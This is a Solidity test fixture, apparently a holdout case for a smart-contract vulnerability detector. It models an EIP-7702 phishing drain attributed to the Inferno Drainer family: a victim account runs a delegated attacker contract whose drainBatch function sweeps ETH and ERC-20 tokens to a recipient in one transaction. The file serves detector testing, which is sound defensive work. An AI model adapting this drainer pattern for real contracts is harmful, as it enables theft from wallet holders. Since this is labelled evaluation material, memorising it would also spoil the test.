// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/// @title eip7702-delegation (b) HOLDOUT fixture - Inferno Drainer batched EIP-7702 sweep (2025-05).
/// @notice Minimized, fully OFFLINE model of the EIP-7702 drain Scam Sniffer attributed to the
///         Inferno Drainer family in May 2025 (a MetaMask user lost ~$146,551). Distinct from the
///         dev CrimeEnjoyor fixture (a single reusable single-asset sweeper): the distinguishing
///         trait here is the *batch* - one phished 7702 authorization lets a single atomic
///         transaction sweep MULTIPLE assets (native + several ERC-20s) out of the account at once.
///
///         7702 "code runs as the account" semantics are modeled explicitly via delegatecall (no
///         vm.signDelegation / Prague dependency), the same convention the dev 7702 fixtures use.
///         Self-contained; no third-party source copied and no reuse of the repo's own toy src, so
///         this is independent of anything the wal detectors were tuned against.
///
///         HOLDOUT: authored after the wal detectors froze at v0.1; wal was NOT tuned to pass it
///         (label=vuln -> expect VULNERABLE). See PROVENANCE.md.

/// @dev Minimal self-contained ERC-20 (test vehicle only; never deploy on a real net).
contract MiniToken {
    mapping(address => uint256) public balanceOf;
    function mint(address to, uint256 amt) external { balanceOf[to] += amt; }
    function transfer(address to, uint256 amt) external returns (bool) {
        require(balanceOf[msg.sender] >= amt, "insufficient");
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @dev One hostile call in the drain batch.
struct Call {
    address target;   // token (or address(0) for native ETH)
    uint256 amount;   // amount to move
}

/// @dev Victim EOA phished into a 7702 "upgrade to smart account" authorization pointing at the
///      attacker delegate. `activate` models the account executing the delegate's code AS the
///      account (delegatecall), so address(this) is the account and its assets move.
contract InfernoAccount {
    address public delegate;

    receive() external payable {}

    /// Victim signs the phished SET_CODE authorization delegating the EOA to `d`.
    function installDelegation(address d) external { delegate = d; }

    /// Anyone activates the installed delegate; its code runs in the account's context.
    function activate(bytes calldata data) external {
        (bool ok, ) = delegate.delegatecall(data);
        require(ok, "activation failed");
    }
}

/// @dev The attacker delegate. One batched entrypoint sweeps every listed asset in a single tx -
///      the 7702 batching that made Inferno's drain atomic and multi-asset.
contract InfernoBatchDrainer {
    /// Executed via delegatecall in the account's context: `address(this)` is the victim account.
    function drainBatch(address recipient, Call[] calldata calls) external {
        for (uint256 i = 0; i < calls.length; i++) {
            if (calls[i].target == address(0)) {
                payable(recipient).transfer(calls[i].amount); // native ETH
            } else {
                MiniToken(calls[i].target).transfer(recipient, calls[i].amount); // ERC-20
            }
        }
    }
}
